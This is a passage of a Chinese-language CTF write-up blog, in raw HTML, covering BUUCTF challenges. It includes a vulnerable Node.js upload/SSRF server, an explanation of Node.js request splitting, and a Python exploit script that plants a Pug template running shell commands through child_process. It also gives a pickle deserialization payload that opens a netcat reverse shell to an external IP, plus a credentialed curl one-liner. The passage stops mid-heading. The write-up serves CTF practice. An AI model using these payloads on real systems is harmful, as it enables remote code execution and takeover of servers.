punctuation">(</span>__dirname<span class="token punctuation">,</span> <span class="token string">'/template'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>app<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span><span class="token string">'/'</span><span class="token punctuation">,</span> <span class="token keyword">function</span><span class="token punctuation">(</span><span class="token parameter">req<span class="token punctuation">,</span> res</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">var</span> action <span class="token operator">=</span> req<span class="token punctuation">.</span>query<span class="token punctuation">.</span>action<span class="token operator">?</span>req<span class="token punctuation">.</span>query<span class="token punctuation">.</span>action<span class="token operator">:</span><span class="token string">"index"</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span> action<span class="token punctuation">.</span><span class="token function">includes</span><span class="token punctuation">(</span><span class="token string">"/"</span><span class="token punctuation">)</span> <span class="token operator">||</span> action<span class="token punctuation">.</span><span class="token function">includes</span><span class="token punctuation">(</span><span class="token string">"\\"</span><span class="token punctuation">)</span> <span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token comment">//action参数过滤斜杠杠</span>        res<span class="token punctuation">.</span><span class="token function">send</span><span class="token punctuation">(</span><span class="token string">"Errrrr, You have been Blocked"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    file <span class="token operator">=</span> path<span class="token punctuation">.</span><span class="token function">join</span><span class="token punctuation">(</span>__dirname <span class="token operator">+</span> <span class="token string">'/template/'</span><span class="token operator">+</span> action <span class="token operator">+</span><span class="token string">'.pug'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">var</span> html <span class="token operator">=</span> pug<span class="token punctuation">.</span><span class="token function">renderFile</span><span class="token punctuation">(</span>file<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//用pug引擎渲染</span>    res<span class="token punctuation">.</span><span class="token function">send</span><span class="token punctuation">(</span>html<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>app<span class="token punctuation">.</span><span class="token function">post</span><span class="token punctuation">(</span><span class="token string">'/file_upload'</span><span class="token punctuation">,</span> <span class="token keyword">function</span><span class="token punctuation">(</span><span class="token parameter">req<span class="token punctuation">,</span> res</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">var</span> ip <span class="token operator">=</span> req<span class="token punctuation">.</span>connection<span class="token punctuation">.</span>remoteAddress<span class="token punctuation">;</span><span class="token comment">//不能用X-Forwarded-For伪造</span>    <span class="token keyword">var</span> obj <span class="token operator">=</span> <span class="token punctuation">&#123;</span>        <span class="token literal-property property">msg</span><span class="token operator">:</span> <span class="token string">''</span><span class="token punctuation">,</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span>ip<span class="token punctuation">.</span><span class="token function">includes</span><span class="token punctuation">(</span><span class="token string">'127.0.0.1'</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        obj<span class="token punctuation">.</span>msg<span class="token operator">=</span><span class="token string">"only admin's ip can use it"</span>        res<span class="token punctuation">.</span><span class="token function">send</span><span class="token punctuation">(</span><span class="token constant">JSON</span><span class="token punctuation">.</span><span class="token function">stringify</span><span class="token punctuation">(</span>obj<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">return</span>     <span class="token punctuation">&#125;</span>    fs<span class="token punctuation">.</span><span class="token function">readFile</span><span class="token punctuation">(</span>req<span class="token punctuation">.</span>files<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">.</span>path<span class="token punctuation">,</span> <span class="token keyword">function</span><span class="token punctuation">(</span><span class="token parameter">err<span class="token punctuation">,</span> data</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">if</span><span class="token punctuation">(</span>err<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>            obj<span class="token punctuation">.</span>msg <span class="token operator">=</span> <span class="token string">'upload failed'</span><span class="token punctuation">;</span>            res<span class="token punctuation">.</span><span class="token function">send</span><span class="token punctuation">(</span><span class="token constant">JSON</span><span class="token punctuation">.</span><span class="token function">stringify</span><span class="token punctuation">(</span>obj<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>            <span class="token keyword">var</span> file_path <span class="token operator">=</span> <span class="token string">'/uploads/'</span> <span class="token operator">+</span> req<span class="token punctuation">.</span>files<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">.</span>mimetype <span class="token operator">+</span><span class="token string">"/"</span><span class="token punctuation">;</span>          <span class="token comment">//任意文件上传并且通过MIME类型来保存文件位置，MIME可控所以可以进行目录穿越</span>            <span class="token keyword">var</span> file_name <span class="token operator">=</span> req<span class="token punctuation">.</span>files<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">.</span>originalname            <span class="token keyword">var</span> dir_file <span class="token operator">=</span> __dirname <span class="token operator">+</span> file_path <span class="token operator">+</span> file_name            <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span>fs<span class="token punctuation">.</span><span class="token function">existsSync</span><span class="token punctuation">(</span>__dirname <span class="token operator">+</span> file_path<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>                <span class="token keyword">try</span> <span class="token punctuation">&#123;</span>                    fs<span class="token punctuation">.</span><span class="token function">mkdirSync</span><span class="token punctuation">(</span>__dirname <span class="token operator">+</span> file_path<span class="token punctuation">)</span>                <span class="token punctuation">&#125;</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span>error<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>                    obj<span class="token punctuation">.</span>msg <span class="token operator">=</span> <span class="token string">"file type error"</span><span class="token punctuation">;</span>                    res<span class="token punctuation">.</span><span class="token function">send</span><span class="token punctuation">(</span><span class="token constant">JSON</span><span class="token punctuation">.</span><span class="token function">stringify</span><span class="token punctuation">(</span>obj<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                    <span class="token keyword">return</span>                <span class="token punctuation">&#125;</span>            <span class="token punctuation">&#125;</span>            <span class="token keyword">try</span> <span class="token punctuation">&#123;</span>                fs<span class="token punctuation">.</span><span class="token function">writeFileSync</span><span class="token punctuation">(</span>dir_file<span class="token punctuation">,</span>data<span class="token punctuation">)</span>                obj <span class="token operator">=</span> <span class="token punctuation">&#123;</span>                    <span class="token literal-property property">msg</span><span class="token operator">:</span> <span class="token string">'upload success'</span><span class="token punctuation">,</span>                    <span class="token literal-property property">filename</span><span class="token operator">:</span> file_path <span class="token operator">+</span> file_name                <span class="token punctuation">&#125;</span>             <span class="token punctuation">&#125;</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span>error<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>                obj<span class="token punctuation">.</span>msg <span class="token operator">=</span> <span class="token string">'upload failed'</span><span class="token punctuation">;</span>            <span class="token punctuation">&#125;</span>            res<span class="token punctuation">.</span><span class="token function">send</span><span class="token punctuation">(</span><span class="token constant">JSON</span><span class="token punctuation">.</span><span class="token function">stringify</span><span class="token punctuation">(</span>obj<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span>app<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span><span class="token string">'/source'</span><span class="token punctuation">,</span> <span class="token keyword">function</span><span class="token punctuation">(</span><span class="token parameter">req<span class="token punctuation">,</span> res</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    res<span class="token punctuation">.</span><span class="token function">sendFile</span><span class="token punctuation">(</span>path<span class="token punctuation">.</span><span class="token function">join</span><span class="token punctuation">(</span>__dirname <span class="token operator">+</span> <span class="token string">'/template/source.txt'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>app<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span><span class="token string">'/core'</span><span class="token punctuation">,</span> <span class="token keyword">function</span><span class="token punctuation">(</span><span class="token parameter">req<span class="token punctuation">,</span> res</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">var</span> q <span class="token operator">=</span> req<span class="token punctuation">.</span>query<span class="token punctuation">.</span>q<span class="token punctuation">;</span>    <span class="token keyword">var</span> resp <span class="token operator">=</span> <span class="token string">""</span><span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>q<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">var</span> url <span class="token operator">=</span> <span class="token string">'http://localhost:8081/source?'</span> <span class="token operator">+</span> q<span class="token comment">//对参数q进行处理并进行本地访问，纯纯SSRF</span>        console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>url<span class="token punctuation">)</span>        <span class="token keyword">var</span> trigger <span class="token operator">=</span> <span class="token function">blacklist</span><span class="token punctuation">(</span>url<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span>trigger <span class="token operator">===</span> <span class="token boolean">true</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            res<span class="token punctuation">.</span><span class="token function">send</span><span class="token punctuation">(</span><span class="token string">"&lt;p>error occurs!&lt;/p>"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>            <span class="token keyword">try</span> <span class="token punctuation">&#123;</span>                http<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span>url<span class="token punctuation">,</span> <span class="token keyword">function</span><span class="token punctuation">(</span><span class="token parameter">resp</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>                    resp<span class="token punctuation">.</span><span class="token function">setEncoding</span><span class="token punctuation">(</span><span class="token string">'utf8'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                    resp<span class="token punctuation">.</span><span class="token function">on</span><span class="token punctuation">(</span><span class="token string">'error'</span><span class="token punctuation">,</span> <span class="token keyword">function</span><span class="token punctuation">(</span><span class="token parameter">err</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>                    <span class="token keyword">if</span> <span class="token punctuation">(</span>err<span class="token punctuation">.</span>code <span class="token operator">===</span> <span class="token string">"ECONNRESET"</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>                     console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">"Timeout occurs"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                     <span class="token keyword">return</span><span class="token punctuation">;</span>                    <span class="token punctuation">&#125;</span>                   <span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                    resp<span class="token punctuation">.</span><span class="token function">on</span><span class="token punctuation">(</span><span class="token string">'data'</span><span class="token punctuation">,</span> <span class="token keyword">function</span><span class="token punctuation">(</span><span class="token parameter">chunk</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>                        <span class="token keyword">try</span> <span class="token punctuation">&#123;</span>                         resps <span class="token operator">=</span> chunk<span class="token punctuation">.</span><span class="token function">toString</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                         res<span class="token punctuation">.</span><span class="token function">send</span><span class="token punctuation">(</span>resps<span class="token punctuation">)</span><span class="token punctuation">;</span>                        <span class="token punctuation">&#125;</span><span class="token keyword">catch</span> <span class="token punctuation">(</span>e<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>                           res<span class="token punctuation">.</span><span class="token function">send</span><span class="token punctuation">(</span>e<span class="token punctuation">.</span>message<span class="token punctuation">)</span><span class="token punctuation">;</span>                        <span class="token punctuation">&#125;</span>                     <span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">on</span><span class="token punctuation">(</span><span class="token string">'error'</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token parameter">e</span><span class="token punctuation">)</span> <span class="token operator">=></span> <span class="token punctuation">&#123;</span>                         res<span class="token punctuation">.</span><span class="token function">send</span><span class="token punctuation">(</span>e<span class="token punctuation">.</span>message<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token punctuation">&#125;</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span>error<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>                console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>error<span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token punctuation">&#125;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>        res<span class="token punctuation">.</span><span class="token function">send</span><span class="token punctuation">(</span><span class="token string">"search param 'q' missing!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token keyword">function</span> <span class="token function">blacklist</span><span class="token punctuation">(</span><span class="token parameter">url</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">var</span> evilwords <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">"global"</span><span class="token punctuation">,</span> <span class="token string">"process"</span><span class="token punctuation">,</span><span class="token string">"mainModule"</span><span class="token punctuation">,</span><span class="token string">"require"</span><span class="token punctuation">,</span><span class="token string">"root"</span><span class="token punctuation">,</span><span class="token string">"child_process"</span><span class="token punctuation">,</span><span class="token string">"exec"</span><span class="token punctuation">,</span><span class="token string">"\""</span><span class="token punctuation">,</span><span class="token string">"'"</span><span class="token punctuation">,</span><span class="token string">"!"</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">var</span> arrayLen <span class="token operator">=</span> evilwords<span class="token punctuation">.</span>length<span class="token punctuation">;</span>    <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">var</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> arrayLen<span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">const</span> trigger <span class="token operator">=</span> url<span class="token punctuation">.</span><span class="token function">includes</span><span class="token punctuation">(</span>evilwords<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span>trigger <span class="token operator">===</span> <span class="token boolean">true</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token keyword">return</span> <span class="token boolean">true</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">var</span> server <span class="token operator">=</span> app<span class="token punctuation">.</span><span class="token function">listen</span><span class="token punctuation">(</span><span class="token number">8081</span><span class="token punctuation">,</span> <span class="token keyword">function</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">var</span> host <span class="token operator">=</span> server<span class="token punctuation">.</span><span class="token function">address</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>address    <span class="token keyword">var</span> port <span class="token operator">=</span> server<span class="token punctuation">.</span><span class="token function">address</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>port    console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">"Example app listening at http://%s:%s"</span><span class="token punctuation">,</span> host<span class="token punctuation">,</span> port<span class="token punctuation">)</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>能分析的都写到代码注释里面了，下面要利用的一个node.js早期的拆分攻击漏洞，先贴一个大佬<span class="exturl"><a class="exturl__link"   href="https://blog.csdn.net/cjdgg/article/details/119068329" >wp</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p><p>拆分攻击，是指在HTTP请求头中伪造出\r\n转义字符，来使得HTTP服务器将一个请求当作两个或多个请求执行，当然，大部分服务器都考虑到了这种情况，会将传来的内容进行转译，node.js也不例外，但是在node.js 8版本及以前，node.js默认使用“latin1”，这是一种单字节编码，不能表示高编号的unicode字符，导致字符会被截断，使得我们需要的\r\n出现，具体可见下面的内容</p><blockquote>        <h1 id="HTTP请求路径中的unicode字符损坏"   >          <a href="#HTTP请求路径中的unicode字符损坏" class="heading-link"><i class="fas fa-link"></i></a><a href="#HTTP请求路径中的unicode字符损坏" class="headerlink" title="HTTP请求路径中的unicode字符损坏"></a>HTTP请求路径中的unicode字符损坏</h1>      <p>一切都开始于我调试的一个非关联的unicode处理issue，并最终将我引向一个错误报告：<a href="https://github.com/nodejs/node/issues/13296">bug report against the Node.js <code>http</code> module</a>,报告中提到：</p><p><a href="https://xzfile.aliyuncs.com/media/upload/picture/20181014005442-ae5afd28-cf08-1.png"><img src="https://xzfile.aliyuncs.com/media/upload/picture/20181014005442-ae5afd28-cf08-1.png" alt="img"></a></p><p>换句话说，报告者使用Node.js向特定路径发出HTTP请求，但是发出的请求实际上被定向到了不一样的路径！深入研究一下，发现这个问题是由Node.js将HTTP请求写入路径时对unicode字符的有损编码引起的。</p><p>虽然用户发出的<code>http</code>请求通常将请求路径指定为字符串，但Node.js最终必须将请求作为原始字节输出。JavaScript支持unicode字符串，因此将它们转换为字节意味着选择并应用适当的unicode编码。对于不包含主体的请求，Node.js默认使用“latin1”，这是一种单字节编码，不能表示高编号的unicode字符，例如🐶</p><p>相反，这些字符被截断为其JavaScript表示的最低字节：<br><a href="https://xzfile.aliyuncs.com/media/upload/picture/20181014005518-c376b332-cf08-1.png"><img src="https://xzfile.aliyuncs.com/media/upload/picture/20181014005518-c376b332-cf08-1.png" alt="img"></a></p><p>处理用户输入时的坏数据通常是底层安全问题的危险信号，我知道我们的代码库发出了可能包含用户输入的路径的HTTP请求。所以我立即在Bugzilla中提交了一个保密的安全漏洞，向node安全团队寻求更多信息，然后根据用户提供的unicode字符串寻找我们可能构建URL的地方。</p><p>内容源自：<span class="exturl"><a class="exturl__link"   href="https://xz.aliyun.com/t/2894" >https://xz.aliyun.com/t/2894</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p></blockquote><p>偷一个大佬的脚本</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> requestspayload <span class="token operator">=</span> <span class="token triple-quoted-string string">""" HTTP/1.1Host: 127.0.0.1Connection: keep-alivePOST /file_upload HTTP/1.1Host: 127.0.0.1Content-Length: &#123;&#125;Content-Type: multipart/form-data; boundary=----WebKitFormBoundarysAs7bV3fMHq0JXUt&#123;&#125;"""</span><span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">'\n'</span><span class="token punctuation">,</span> <span class="token string">'\r\n'</span><span class="token punctuation">)</span>body <span class="token operator">=</span> <span class="token triple-quoted-string string">"""------WebKitFormBoundarysAs7bV3fMHq0JXUtContent-Disposition: form-data; name="file"; filename="lmonstergg.pug"Content-Type: ../template-var x = eval("glob"+"al.proce"+"ss.mainMo"+"dule.re"+"quire('child_'+'pro'+'cess')['ex'+'ecSync']('cat /flag.txt').toString()")-return x------WebKitFormBoundarysAs7bV3fMHq0JXUt--"""</span><span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">'\n'</span><span class="token punctuation">,</span> <span class="token string">'\r\n'</span><span class="token punctuation">)</span>payload <span class="token operator">=</span> payload<span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span><span class="token builtin">len</span><span class="token punctuation">(</span>body<span class="token punctuation">)</span><span class="token punctuation">,</span> body<span class="token punctuation">)</span> \    <span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">'+'</span><span class="token punctuation">,</span> <span class="token string">'\u012b'</span><span class="token punctuation">)</span>             \    <span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">' '</span><span class="token punctuation">,</span> <span class="token string">'\u0120'</span><span class="token punctuation">)</span>             \    <span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">'\r\n'</span><span class="token punctuation">,</span> <span class="token string">'\u010d\u010a'</span><span class="token punctuation">)</span>    \    <span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">'"'</span><span class="token punctuation">,</span> <span class="token string">'\u0122'</span><span class="token punctuation">)</span>             \    <span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">"'"</span><span class="token punctuation">,</span> <span class="token string">'\u0a27'</span><span class="token punctuation">)</span>             \    <span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">'['</span><span class="token punctuation">,</span> <span class="token string">'\u015b'</span><span class="token punctuation">)</span>             \    <span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">']'</span><span class="token punctuation">,</span> <span class="token string">'\u015d'</span><span class="token punctuation">)</span> \    <span class="token operator">+</span> <span class="token string">'GET'</span> <span class="token operator">+</span> <span class="token string">'\u0120'</span> <span class="token operator">+</span> <span class="token string">'/'</span>session <span class="token operator">=</span> requests<span class="token punctuation">.</span>Session<span class="token punctuation">(</span><span class="token punctuation">)</span>session<span class="token punctuation">.</span>trust_env <span class="token operator">=</span> <span class="token boolean">False</span>response1 <span class="token operator">=</span> session<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">'http://8467d768-1851-4764-bf73-e93bedea88bc.node4.buuoj.cn:81/core?q='</span> <span class="token operator">+</span> payload<span class="token punctuation">)</span>response <span class="token operator">=</span> session<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">'http://8467d768-1851-4764-bf73-e93bedea88bc.node4.buuoj.cn:81/?action=lmonstergg'</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>response<span class="token punctuation">.</span>text<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>        <h2 id="watevrCTF-2019-Pickle-Store"   >          <a href="#watevrCTF-2019-Pickle-Store" class="heading-link"><i class="fas fa-link"></i></a><a href="#watevrCTF-2019-Pickle-Store" class="headerlink" title="[watevrCTF-2019]Pickle Store"></a>[watevrCTF-2019]Pickle Store</h2>      <p>明示pickle，先解码看看</p><p><img src="https://jlan-blog.oss-cn-beijing.aliyuncs.com/202206151820591.png"></p><p>很明显有加密验证啊，那就不能伪造内容了，只能自己搞个类反弹shell了</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> base64<span class="token keyword">import</span> pickle<span class="token keyword">class</span> <span class="token class-name">A</span><span class="token punctuation">(</span><span class="token builtin">object</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">def</span> <span class="token function">__reduce__</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">return</span> <span class="token punctuation">(</span><span class="token builtin">eval</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token string">"__import__('os').system('nc 43.249.193.167 38901 -e/bin/sh')"</span><span class="token punctuation">,</span><span class="token punctuation">)</span><span class="token punctuation">)</span>a <span class="token operator">=</span> A<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>base64<span class="token punctuation">.</span>b64encode<span class="token punctuation">(</span>pickle<span class="token punctuation">.</span>dumps<span class="token punctuation">(</span>a<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>        <h2 id="CISCN2019-华东北赛区-Web2"   >          <a href="#CISCN2019-华东北赛区-Web2" class="heading-link"><i class="fas fa-link"></i></a><a href="#CISCN2019-华东北赛区-Web2" class="headerlink" title="[CISCN2019 华东北赛区]Web2"></a>[CISCN2019 华东北赛区]Web2</h2>      <p>XSSSSSSSSSSSSSS，不出网，还是之后XSS平台能用了再说吧</p>        <h2 id="RootersCTF2019-ImgXweb"   >          <a href="#RootersCTF2019-ImgXweb" class="heading-link"><i class="fas fa-link"></i></a><a href="#RootersCTF2019-ImgXweb" class="headerlink" title="[RootersCTF2019]ImgXweb"></a>[RootersCTF2019]ImgXweb</h2>      <p>注册登录看到jwt，扫目录扫出来密钥，直接伪造admin就行</p>        <h2 id="GWCTF-2019-你的名字"   >          <a href="#GWCTF-2019-你的名字" class="heading-link"><i class="fas fa-link"></i></a><a href="#GWCTF-2019-你的名字" class="headerlink" title="[GWCTF 2019]你的名字"></a>[GWCTF 2019]你的名字</h2>      <p>除了SSTI还能是啥</p><p>测试呗，输入个两对花括号发现被滤了，<del>还爆出了是php环境，其实并不是，估计是BUU复现环境的问题</del></p><p>没关系还有命令执行可用，啥符号都没过滤直接拼接就行</p>        <h2 id="BSidesCF-2020-Hurdles"   >          <a href="#BSidesCF-2020-Hurdles" class="heading-link"><i class="fas fa-link"></i></a><a href="#BSidesCF-2020-Hurdles" class="headerlink" title="[BSidesCF 2020]Hurdles"></a>[BSidesCF 2020]Hurdles</h2>      <p>谢谢这道题，让我狠狠了解了一把curl怎么用</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">curl</span> <span class="token parameter variable">-i</span> <span class="token parameter variable">-X</span> PUT <span class="token string">'http://node4.buuoj.cn:26923/hurdles/!?get=flag&amp;%26%3D%26%3D%26=%2500%0a'</span> <span class="token parameter variable">-u</span> <span class="token string">'player:54ef36ec71201fdf9d1423fd26f97f6b'</span> <span class="token parameter variable">-A</span> <span class="token string">'1337 Browser v.9001'</span> <span class="token parameter variable">-H</span> <span class="token string">"X-Forwarded-For:13.37.13.37,127.0.0.1"</span> <span class="token parameter variable">-b</span> <span class="token string">"Fortune=6265"</span> <span class="token parameter variable">-H</span> <span class="token string">"Accept:text/plain"</span> <span class="token parameter variable">-H</span> <span class="token string">"Accept-Language:ru"</span> <span class="token parameter variable">-H</span> <span class="token string">"origin:https://ctf.bsidessf.net"</span> <span class="token parameter variable">-H</span> <span class="token string">"referer:https://ctf.bsidessf.net/challenges"</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>curl使用方法</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">curl</span> <span class="token parameter variable">-o</span> 文件名 链接 <span class="token comment">#下载URL内容并重命名为文件名</span><span class="token parameter variable">-O</span> 链接 <span class="token comment">#以URL结尾做文件名</span><span class="token parameter variable">-L</span> <span class="token comment">#跟随重定向跳转</span><span class="token parameter variable">-C</span> - <span class="token parameter variable">-O</span> 链接 <span class="token comment">#继续被中断的下载</span>--trace-ascii 文件 链接 <span class="token comment">#将整个curl命令执行过程写入文件</span><span class="token parameter variable">-X</span> 请求方式 <span class="token comment">#使用指定的请求方式来发起请求</span><span class="token parameter variable">-F</span> <span class="token string">"name=@文件本地路径"</span> <span class="token comment">#上传文件</span><span class="token parameter variable">--data</span> <span class="token comment">#带POST参数，可带json</span><span class="token parameter variable">--cookie</span> <span class="token comment">#携带cookie</span><span class="token parameter variable">--cookie</span> stored_cookies_file_path <span class="token comment">#读取cookie</span>--user-agent 或者 <span class="token parameter variable">-A</span> <span class="token comment">#带UA头</span><span class="token parameter variable">-H</span> <span class="token comment">#带请求头</span><span class="token parameter variable">--user</span> username:password <span class="token comment">#通过Basic Authentication验证</span><span class="token parameter variable">-i</span> <span class="token comment">#显示完整响应</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>        <h2 id="HarekazeCTF2019-Easy-Notes"   >          <a href="#HarekazeCTF2019-Easy-Notes" class="heading-link"><i class="fas fa-link"></i></a><a href="#HarekazeCTF2019-Easy-Notes" class="headerlink" 